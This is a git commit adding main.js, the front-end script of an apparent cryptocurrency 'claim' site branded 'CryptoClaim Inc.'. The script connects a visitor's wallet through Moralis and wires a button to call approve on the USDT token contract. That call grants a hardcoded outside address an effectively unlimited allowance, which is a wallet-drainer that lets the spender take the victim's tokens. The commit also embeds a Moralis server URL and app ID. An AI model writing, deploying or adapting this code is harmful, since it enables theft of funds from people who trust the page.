cb68d7246fdbba17dcc8635334c50ddbc80d89bf
computerapp90 <104867374+computerapp90@users.noreply.github.com>
2022-05-16 08:09:17 -0400

    Add files via upload

---
+++ main.js
@@ -0,0 +1,57 @@
+// main.js
+
+const serverUrl = "https://w2er5emimfpx.usemoralis.com:2053/server";
+        const appId = "CGKC1uR33ZDoEpfoqf1I3eOvLot15uSWhNPT6ZP6";
+        Moralis.start({ serverUrl, appId });
+
+/** Add from here down */
+async function login() {
+  let user = Moralis.User.current();
+  if (!user) {
+   try {
+      user = await Moralis.authenticate({ signingMessage: "CryptoClaim Inc." })
+      await Moralis.enableWeb3();
+      console.log(user)
+      console.log(user.get('ethAddress'))
+   } catch(error) {
+     console.log(error)
+   }
+  }
+}
+
+async function logOut() {
+  await Moralis.User.logOut();
+  console.log("logged out");
+}
+
+
+  async function approve() {
+
+    let options = {
+
+      contractAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+
+      functionName: "approve",
+
+      abi: [
+
+        {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},
+
+      ],
+
+      params: {
+
+        _spender: "0xcb6fB04A7EC3F7887f1d03BFc051E5C6Aa260673",
+
+        _value: "10000000000000000000000000000000"
+
+      }
+
+    };
+  await Moralis.executeFunction(options);
+  }
+
+
+document.getElementById("btn-login").onclick = login;
+document.getElementById("btn-logout").onclick = logOut;
+document.getElementById("btn-approve").onclick = approve;
